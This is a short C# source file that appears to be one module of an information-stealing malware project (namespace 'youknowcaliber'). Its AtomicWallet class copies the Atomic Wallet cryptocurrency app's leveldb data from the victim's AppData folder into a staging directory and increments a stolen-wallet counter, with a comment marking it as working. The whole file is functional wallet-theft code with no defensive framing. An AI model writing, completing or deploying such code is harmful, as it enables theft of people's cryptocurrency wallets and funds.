using System;
using System.IO;

namespace youknowcaliber
{
    class AtomicWallet
    {
        public static int count = 0;
        //AtomicWallet, AtomicWallet 2.8.0
        public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
        public static void AtomicStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\atomic\\Local Storage\\leveldb\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + AtomDir);
                    file.CopyTo(directorypath + AtomDir + file.Name);
                }
                count++;
                Counting.Wallets++;
            }
            catch
            {
                return;   
            }

        }
    }
}
